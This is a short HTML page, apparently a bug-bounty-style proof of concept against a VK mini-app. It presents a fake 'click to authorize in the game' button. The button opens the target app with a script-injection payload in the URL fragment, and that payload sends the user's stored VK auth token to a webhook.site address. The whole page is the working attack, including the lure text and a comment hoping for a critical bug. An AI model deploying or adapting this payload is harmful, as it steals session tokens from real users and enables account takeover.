<!DOCTYPE html>
<html>
<head>
    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
</head>
<body>
    <h1>Нажми для авторизации в игре</h1>
    <button onclick="exploit()" style="padding: 20px;">ИГРАТЬ</button>

    <script>
        vkBridge.send('VKWebAppInit');

        function exploit() {
            // Мы перенаправляем пользователя на ту же страницу, но пытаемся 
            // передать код через URL. Это имитация атаки на "доверие".
            const targetApp = "https://vk.com/app51491054";
            const payload = "<script>fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?token='+localStorage.getItem('6287487:web_token:login:auth'))<\/script>";
            
            // Если мы найдем способ прокинуть этот payload в приложение - это 100% Critical Bug
            window.open(targetApp + "#" + payload, "_blank");
            
            alert("Попытка инъекции выполнена. Если приложение уязвимо, токен уйдет на Webhook.");
        }
    </script>
</body>
</html>
